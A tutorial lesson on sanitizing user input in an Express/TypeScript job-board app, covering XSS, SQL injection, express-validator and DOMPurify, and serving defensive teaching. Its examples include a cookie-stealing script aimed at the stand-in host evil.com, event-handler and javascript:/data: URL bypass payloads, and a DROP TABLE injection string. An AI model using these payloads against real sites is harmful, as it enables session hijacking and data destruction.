# Lesson 2: Data Sanitization

## Validation Checks Format—Sanitization Removes Danger

> "Validation tells you if an email looks like an email. Sanitization tells you if that email contains a hidden script that will steal your users' cookies. These are different problems requiring different solutions."

Zod confirmed the email field contains a string that matches an email pattern. Great. But what if that "valid" email is:

```html
user+
<script>
  document.location = "http://evil.com/?c=" + document.cookie;
</script>
@example.com
```

Technically valid format. Absolutely dangerous content.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    VALIDATION vs SANITIZATION                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  User Input: "<script>alert('XSS')</script>"                               │
│                                                                             │
│  ┌──────────────┐                                                          │
│  │  VALIDATION  │  "Is this a string?"  →  ✅ Yes, it's a string           │
│  └──────────────┘  (Format check passed)                                   │
│                                                                             │
│  ┌──────────────┐                                                          │
│  │ SANITIZATION │  "Is this safe?"  →  ❌ Contains executable code         │
│  └──────────────┘  (Content check failed)                                  │
│                                                                             │
│  ┌──────────────┐                                                          │
│  │   RESULT     │  Output: "&lt;script&gt;alert('XSS')&lt;/script&gt;"    │
│  └──────────────┘  (Escaped and safe to render)                            │
│                                                                             │
│  REMEMBER: Validation ≠ Sanitization                                        │
│            Both are needed for security                                     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Understanding Attack Vectors

### Cross-Site Scripting (XSS)

XSS attacks inject malicious scripts into pages viewed by other users.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         XSS ATTACK FLOW                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  1. ATTACKER                                                                │
│     ┌─────────────────────────────────────────────────────┐                │
│     │ POST /jobs                                          │                │
│     │ { "description": "<script>stealCookies()</script>"} │                │
│     └─────────────────────────────────────────────────────┘                │
│                          │                                                  │
│                          ▼                                                  │
│  2. SERVER (No Sanitization)                                               │
│     ┌─────────────────────────────────────────────────────┐                │
│     │ Stores malicious script in database                 │                │
│     └─────────────────────────────────────────────────────┘                │
│                          │                                                  │
│                          ▼                                                  │
│  3. VICTIM                                                                  │
│     ┌─────────────────────────────────────────────────────┐                │
│     │ GET /jobs/123                                       │                │
│     │ Browser renders page with embedded script           │                │
│     │ Script executes → Cookies sent to attacker          │                │
│     └─────────────────────────────────────────────────────┘                │
│                                                                             │
│  DAMAGE: Session hijacking, data theft, defacement                         │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Types of XSS

| Type              | Description                        | Example                             |
| ----------------- | ---------------------------------- | ----------------------------------- |
| **Stored XSS**    | Malicious script saved in database | Job description with `<script>`     |
| **Reflected XSS** | Script in URL parameters           | `?search=<script>alert(1)</script>` |
| **DOM-based XSS** | Client-side script manipulation    | Unsafe use of `innerHTML`           |

### SQL Injection (Even with ORMs)

While ORMs like Drizzle and Prisma provide protection, raw queries can still be vulnerable.

```typescript
// ❌ VULNERABLE: Raw query with string interpolation
const result = await db.execute(`SELECT * FROM users WHERE email = '${email}'`);

// Attack input: email = "'; DROP TABLE users; --"
// Resulting query: SELECT * FROM users WHERE email = ''; DROP TABLE users; --'

// ✅ SAFE: Parameterized query
const result = await db.execute(
  sql`SELECT * FROM users WHERE email = ${email}`,
);
// ORM properly escapes the input
```

---

## Sanitization Strategies

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    SANITIZATION DECISION TREE                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  What type of input?                                                        │
│         │                                                                   │
│    ┌────┴────────────────────┬──────────────────┐                          │
│    │                         │                  │                          │
│    ▼                         ▼                  ▼                          │
│  Plain Text              Rich HTML         File Upload                     │
│    │                         │                  │                          │
│    ▼                         ▼                  ▼                          │
│  ┌─────────┐           ┌──────────┐       ┌──────────┐                    │
│  │ Escape  │           │ DOMPurify│       │ Validate │                    │
│  │ & Trim  │           │ Whitelist│       │ MIME,Size│                    │
│  └─────────┘           └──────────┘       └──────────┘                    │
│                                                                             │
│  STRATEGIES BY INPUT TYPE:                                                  │
│                                                                             │
│  • Plain text  → Trim + Escape HTML entities                               │
│  • Emails      → Trim + Lowercase + Normalize                              │
│  • URLs        → Validate protocol + Sanitize                              │
│  • Rich HTML   → Whitelist allowed tags + DOMPurify                        │
│  • Numbers     → Parse + Range check                                       │
│  • Files       → Type check + Size limit + Name sanitize                   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Using express-validator for Sanitization

`express-validator` provides both validation and sanitization functions.

### Installation

```bash
npm install express-validator
```

### Basic Sanitizers

```typescript
import { body, query } from "express-validator";

// String sanitizers
body("name").trim(); // Remove whitespace from ends
body("email").normalizeEmail(); // Lowercase, remove dots (Gmail)
body("bio").escape(); // Convert <, >, &, ", ' to HTML entities
body("title").stripLow(); // Remove control characters
body("slug").blacklist(" "); // Remove specific characters
body("code").whitelist("a-zA-Z0-9"); // Keep only specified characters

// Type coercion
body("age").toInt(); // Convert to integer
body("price").toFloat(); // Convert to float
body("active").toBoolean(); // Convert to boolean
body("tags").toArray(); // Ensure array (wrap single value)
```

### Sanitization Middleware

```typescript
// src/middleware/sanitize.ts
import { body, validationResult } from "express-validator";
import { Request, Response, NextFunction } from "express";

// Sanitization chain for user registration
export const sanitizeRegistration = [
  body("firstName").trim().escape(),
  body("lastName").trim().escape(),
  body("email").trim().normalizeEmail(),
  body("bio").optional().trim().escape(),
];

// Sanitization chain for job posting
export const sanitizeJobPosting = [
  body("title").trim().escape(),
  body("company").trim().escape(),
  body("location").trim().escape(),
  // Note: description needs special handling (allows some HTML)
  body("skills.*").trim().escape(), // Sanitize each skill in array
];

// Generic sanitization runner (doesn't validate, just sanitizes)
export function runSanitization(sanitizers: any[]) {
  return async (req: Request, res: Response, next: NextFunction) => {
    await Promise.all(sanitizers.map((sanitizer) => sanitizer.run(req)));
    next();
  };
}
```

### Using Sanitizers with Zod

Combine sanitization with Zod validation:

```typescript
// src/middleware/sanitize-and-validate.ts
import { Request, Response, NextFunction } from "express";
import { ZodSchema } from "zod";

export function sanitizeAndValidate(sanitizers: any[], schema: ZodSchema) {
  return async (req: Request, res: Response, next: NextFunction) => {
    // Step 1: Run sanitizers
    await Promise.all(sanitizers.map((s) => s.run(req)));

    // Step 2: Validate with Zod
    const result = schema.safeParse(req.body);

    if (!result.success) {
      return res.status(400).json({
        success: false,
        message: "Validation failed",
        errors: result.error.flatten().fieldErrors,
      });
    }

    req.body = result.data;
    next();
  };
}

// Usage in routes
import { sanitizeJobPosting } from "../middleware/sanitize";
import { createJobSchema } from "../schemas/job.schema";

router.post(
  "/jobs",
  sanitizeAndValidate(sanitizeJobPosting, createJobSchema),
  jobController.create,
);
```

---

## DOMPurify for HTML Content

Some fields need to allow HTML (like job descriptions with formatting), but you must sanitize it carefully.

### Installation

```bash
npm install dompurify jsdom
npm install -D @types/dompurify @types/jsdom
```

### Basic Usage

```typescript
// src/utils/sanitize-html.ts
import createDOMPurify from "dompurify";
import { JSDOM } from "jsdom";

const window = new JSDOM("").window;
const DOMPurify = createDOMPurify(window);

// Basic sanitization - removes all dangerous content
export function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty);
}

// Whitelist specific tags and attributes
export function sanitizeRichText(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: [
      "p",
      "br",
      "strong",
      "em",
      "u",
      "s",
      "h1",
      "h2",
      "h3",
      "h4",
      "h5",
      "h6",
      "ul",
      "ol",
      "li",
      "a",
      "blockquote",
      "code",
      "pre",
    ],
    ALLOWED_ATTR: ["href", "title", "target"],
    ALLOW_DATA_ATTR: false,
  });
}

// Strip ALL HTML (plain text only)
export function stripHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: [],
  });
}
```

### Sanitization Levels

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    HTML SANITIZATION LEVELS                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  INPUT: "<p onclick='evil()'>Hello</p><script>bad()</script>"              │
│                                                                             │
│  LEVEL 1: Strip All (Plain Text)                                           │
│  ─────────────────────────────────                                          │
│  Output: "Hello"                                                            │
│  Use for: Usernames, titles, search queries                                │
│                                                                             │
│  LEVEL 2: Basic HTML (Formatting Only)                                     │
│  ──────────────────────────────────────                                     │
│  Allowed: <p>, <strong>, <em>, <br>                                        │
│  Output: "<p>Hello</p>"                                                    │
│  Use for: Comments, short bios                                             │
│                                                                             │
│  LEVEL 3: Rich HTML (Full Formatting)                                      │
│  ─────────────────────────────────────                                      │
│  Allowed: + <h1>-<h6>, <ul>, <ol>, <li>, <a>, <code>                      │
│  Output: "<p>Hello</p>"                                                    │
│  Use for: Blog posts, job descriptions                                     │
│                                                                             │
│  ALL LEVELS: <script>, onclick, onerror, etc. ALWAYS removed              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Mini-Tutorial: Sanitization Middleware Chain

Let's build a complete sanitization middleware for DevJobs Pro job postings.

### Step 1: Create the Sanitizer Utility

```typescript
// src/utils/sanitize.ts
import createDOMPurify from "dompurify";
import { JSDOM } from "jsdom";

const window = new JSDOM("").window;
const DOMPurify = createDOMPurify(window);

interface SanitizeOptions {
  allowHtml?: boolean;
  allowedTags?: string[];
  maxLength?: number;
}

export function sanitizeString(
  input: string,
  options: SanitizeOptions = {},
): string {
  let result = input;

  // Trim whitespace
  result = result.trim();

  if (options.allowHtml && options.allowedTags) {
    // Sanitize HTML, keeping allowed tags
    result = DOMPurify.sanitize(result, {
      ALLOWED_TAGS: options.allowedTags,
      ALLOWED_ATTR: ["href", "title", "target"],
    });
  } else if (!options.allowHtml) {
    // Strip all HTML
    result = DOMPurify.sanitize(result, {
      ALLOWED_TAGS: [],
      ALLOWED_ATTR: [],
    });
  }

  // Enforce max length
  if (options.maxLength && result.length > options.maxLength) {
    result = result.substring(0, options.maxLength);
  }

  return result;
}

export function sanitizeEmail(email: string): string {
  return email.trim().toLowerCase().replace(/\+.*@/, "@"); // Remove + aliases (optional)
}

export function sanitizeUrl(url: string): string | null {
  try {
    const parsed = new URL(url);
    // Only allow http and https
    if (!["http:", "https:"].includes(parsed.protocol)) {
      return null;
    }
    return parsed.toString();
  } catch {
    return null;
  }
}
```

### Step 2: Create Field-Specific Sanitizers

```typescript
// src/middleware/job-sanitizer.ts
import { Request, Response, NextFunction } from "express";
import { sanitizeString, sanitizeUrl } from "../utils/sanitize";

const ALLOWED_DESCRIPTION_TAGS = [
  "p",
  "br",
  "strong",
  "em",
  "u",
  "h2",
  "h3",
  "h4",
  "ul",
  "ol",
  "li",
  "a",
  "blockquote",
  "code",
  "pre",
];

export function sanitizeJobInput(
  req: Request,
  res: Response,
  next: NextFunction,
) {
  const { body } = req;

  // Sanitize title (plain text)
  if (body.title) {
    body.title = sanitizeString(body.title, {
      allowHtml: false,
      maxLength: 100,
    });
  }

  // Sanitize company (plain text)
  if (body.company) {
    body.company = sanitizeString(body.company, {
      allowHtml: false,
      maxLength: 100,
    });
  }

  // Sanitize description (rich HTML allowed)
  if (body.description) {
    body.description = sanitizeString(body.description, {
      allowHtml: true,
      allowedTags: ALLOWED_DESCRIPTION_TAGS,
      maxLength: 5000,
    });
  }

  // Sanitize location (plain text)
  if (body.location) {
    body.location = sanitizeString(body.location, {
      allowHtml: false,
      maxLength: 200,
    });
  }

  // Sanitize skills array
  if (Array.isArray(body.skills)) {
    body.skills = body.skills
      .map((skill: string) =>
        sanitizeString(skill, { allowHtml: false, maxLength: 50 }),
      )
      .filter(Boolean); // Remove empty strings
  }

  // Sanitize application URL
  if (body.applicationUrl) {
    const sanitizedUrl = sanitizeUrl(body.applicationUrl);
    if (sanitizedUrl) {
      body.applicationUrl = sanitizedUrl;
    } else {
      delete body.applicationUrl; // Remove invalid URL
    }
  }

  next();
}
```

### Step 3: Combine Sanitization with Validation

```typescript
// src/routes/job.routes.ts
import { Router } from "express";
import { sanitizeJobInput } from "../middleware/job-sanitizer";
import { validate } from "../middleware/validate";
import { createJobSchema, updateJobSchema } from "../schemas/job.schema";
import { jobController } from "../controllers/job.controller";

const router = Router();

// Sanitize BEFORE validate - clean the data, then check it
router.post(
  "/",
  sanitizeJobInput,
  validate(createJobSchema),
  jobController.create,
);

router.put(
  "/:id",
  sanitizeJobInput,
  validate(updateJobSchema),
  jobController.update,
);

export default router;
```

### Step 4: Test the Sanitization

```typescript
// Test script or API call
const maliciousJob = {
  title: '<script>alert("XSS")</script>Senior Developer',
  company: "Acme Corp<img src=x onerror=alert(1)>",
  description: `
    <h2>About the Role</h2>
    <p>We're looking for a <strong>senior developer</strong>.</p>
    <script>document.location='http://evil.com'</script>
    <p onclick="stealData()">Requirements:</p>
    <ul>
      <li>5+ years experience</li>
      <li>Node.js expertise</li>
    </ul>
  `,
  skills: ["<b>JavaScript</b>", "TypeScript", "<script>bad()</script>"],
};

// After sanitization:
// {
//   title: 'Senior Developer',
//   company: 'Acme Corp',
//   description: '<h2>About the Role</h2><p>We're looking for a <strong>senior developer</strong>.</p><p>Requirements:</p><ul><li>5+ years experience</li><li>Node.js expertise</li></ul>',
//   skills: ['JavaScript', 'TypeScript', ''],
// }
```

---

## Practice: DevJobs Pro Sanitization

### Task 1: Application Message Sanitizer

Create a sanitizer for job applications that:

- Allows basic formatting in cover letters (bold, italic, lists)
- Strips dangerous content
- Enforces a 2000 character limit

```typescript
// TODO: Create src/middleware/application-sanitizer.ts

export function sanitizeApplicationInput(
  req: Request,
  res: Response,
  next: NextFunction,
) {
  // Your implementation
}
```

### Task 2: User Profile Sanitizer

Create a sanitizer for user profiles that:

- Sanitizes display name (plain text only)
- Allows limited HTML in bio (p, strong, em, a)
- Validates and sanitizes portfolio URLs
- Sanitizes social media handles

```typescript
// TODO: Create src/middleware/profile-sanitizer.ts

export function sanitizeProfileInput(
  req: Request,
  res: Response,
  next: NextFunction,
) {
  // Your implementation
}
```

### Task 3: Search Query Sanitizer

Create a sanitizer for search queries that:

- Strips all HTML from search terms
- Removes special characters that could break queries
- Normalizes whitespace
- Enforces max length

```typescript
// TODO: Create src/middleware/search-sanitizer.ts

export function sanitizeSearchQuery(
  req: Request,
  res: Response,
  next: NextFunction,
) {
  // Your implementation
}
```

<details>
<summary>💡 Solution: Application Message Sanitizer</summary>

```typescript
// src/middleware/application-sanitizer.ts
import { Request, Response, NextFunction } from "express";
import { sanitizeString, sanitizeUrl } from "../utils/sanitize";

const ALLOWED_COVER_LETTER_TAGS = ["p", "br", "strong", "em", "ul", "ol", "li"];

export function sanitizeApplicationInput(
  req: Request,
  res: Response,
  next: NextFunction,
) {
  const { body } = req;

  // Sanitize cover letter (limited HTML)
  if (body.coverLetter) {
    body.coverLetter = sanitizeString(body.coverLetter, {
      allowHtml: true,
      allowedTags: ALLOWED_COVER_LETTER_TAGS,
      maxLength: 2000,
    });
  }

  // Sanitize resume URL
  if (body.resumeUrl) {
    const sanitizedUrl = sanitizeUrl(body.resumeUrl);
    if (!sanitizedUrl) {
      return res.status(400).json({
        success: false,
        message: "Invalid resume URL",
      });
    }
    body.resumeUrl = sanitizedUrl;
  }

  // Sanitize portfolio URL
  if (body.portfolioUrl) {
    const sanitizedUrl = sanitizeUrl(body.portfolioUrl);
    body.portfolioUrl = sanitizedUrl || undefined;
  }

  // Sanitize additional notes (plain text)
  if (body.notes) {
    body.notes = sanitizeString(body.notes, {
      allowHtml: false,
      maxLength: 500,
    });
  }

  next();
}
```

</details>

---

## Pro Tips vs Junior Traps

| Pro Tip 🎯                               | Junior Trap ⚠️                                     |
| ---------------------------------------- | -------------------------------------------------- |
| Sanitize on INPUT, escape on OUTPUT      | Only sanitize on output                            |
| Use allowlists (whitelist) for HTML tags | Use blocklists (blacklist)—attackers find bypasses |
| Apply different sanitization per field   | Use same sanitization for everything               |
| Combine Zod validation + sanitization    | Rely on validation alone                           |
| Test with OWASP XSS payloads             | Only test with `<script>alert(1)</script>`         |
| Log sanitization changes for debugging   | Silently modify data                               |
| Keep DOMPurify updated                   | Use outdated sanitization library                  |
| Sanitize file names, not just content    | Forget about file upload vectors                   |

---

## 5-Minute Debugger 🐛

### Problem: "HTML stripped unexpectedly"

````
┌─────────────────────────────────────────────────────────────────────────────┐
│  SYMPTOM: Valid HTML formatting is being removed                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  POSSIBLE CAUSES:                                                           │
│                                                                             │
│  1. Tag not in allowlist                                                    │
│     ───────────────────────                                                 │
│     ❌ Using <strong> but only 'b' is allowed                              │
│                                                                             │
│     FIX: Add the tag to ALLOWED_TAGS                                       │
│     ```                                                                     │
│     ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'b', 'i']                   │
│     ```                                                                     │
│                                                                             │
│  2. Attribute not in allowlist                                             │
│     ─────────────────────────                                               │
│     ❌ <a href="..."> has href removed                                     │
│                                                                             │
│     FIX: Add attribute to ALLOWED_ATTR                                     │
│     ```                                                                     │
│     ALLOWED_ATTR: ['href', 'title', 'target', 'rel']                       │
│     ```                                                                     │
│                                                                             │
│  3. Using escape() instead of sanitize()                                   │
│     ─────────────────────────────────────                                   │
│     ❌ escape() converts ALL HTML to entities                              │
│                                                                             │
│     FIX: Use DOMPurify.sanitize() with allowlist                          │
│                                                                             │
│  4. Double sanitization                                                     │
│     ──────────────────────                                                  │
│     ❌ Sanitizing already-sanitized content                                │
│                                                                             │
│     FIX: Sanitize once at input, not repeatedly                           │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
````

### Problem: XSS still getting through

````
┌─────────────────────────────────────────────────────────────────────────────┐
│  SYMPTOM: XSS payload bypassed sanitization                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  COMMON BYPASS VECTORS:                                                     │
│                                                                             │
│  1. javascript: URLs                                                        │
│     ─────────────────                                                       │
│     ❌ <a href="javascript:alert(1)">Click</a>                             │
│                                                                             │
│     FIX: Add href sanitization                                             │
│     ```                                                                     │
│     DOMPurify.sanitize(input, {                                            │
│       ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i                           │
│     })                                                                     │
│     ```                                                                     │
│                                                                             │
│  2. data: URLs                                                              │
│     ──────────                                                              │
│     ❌ <img src="data:text/html,<script>alert(1)</script>">               │
│                                                                             │
│     FIX: Don't allow data: protocol                                        │
│                                                                             │
│  3. Event handlers in allowed attributes                                   │
│     ─────────────────────────────────────                                   │
│     ❌ <a href="#" onclick="alert(1)">                                     │
│                                                                             │
│     FIX: DOMPurify removes these by default—make sure it's enabled        │
│                                                                             │
│  UPDATE: Always use latest DOMPurify version                               │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
````

### Debug Checklist

```
□ Is DOMPurify installed and updated?
□ Are you sanitizing at the right point (before storage)?
□ Is the allowlist correctly configured?
□ Are you escaping on output as well?
□ Have you tested with OWASP XSS cheat sheet payloads?
□ Are URLs being validated for protocol?
□ Are file uploads being sanitized (not just validated)?
```

---

## Definition of Done ✅

Before moving to the next lesson, verify:

- [ ] **Utilities created**: `src/utils/sanitize.ts` with sanitization functions
- [ ] **DOMPurify configured**: Rich text sanitization with allowlist
- [ ] **Middleware chain**: Sanitization runs before validation
- [ ] **Job sanitizer**: `sanitizeJobInput` handles all job fields
- [ ] **Application sanitizer**: Cover letter allows limited HTML
- [ ] **Profile sanitizer**: Bio and URLs properly sanitized
- [ ] **Tested with XSS payloads**: Basic XSS attempts are blocked
- [ ] **No double sanitization**: Data sanitized once at input

### Quick Sanitization Test

```bash
# Test that XSS is blocked
curl -X POST http://localhost:3000/api/jobs \
  -H "Content-Type: application/json" \
  -d '{
    "title": "<script>alert(1)</script>Developer",
    "description": "<p>Hello</p><script>bad()</script>"
  }'

# Check response - script tags should be stripped
```

---

## What's Next?

You've learned to clean dangerous content from user input. But security isn't just about what users send—it's also about how browsers handle your responses.

In the next lesson, we'll learn about **Security Headers and CORS**—HTTP headers that tell browsers how to protect your users.

---

## Navigation

| Previous                                                   | Current                         | Next                                                                      |
| ---------------------------------------------------------- | ------------------------------- | ------------------------------------------------------------------------- |
| [Lesson 1: Input Validation](./01-input-validation-zod.md) | **Lesson 2: Data Sanitization** | [Lesson 3: Security Headers & CORS](./03-security-headers-helmet-cors.md) |
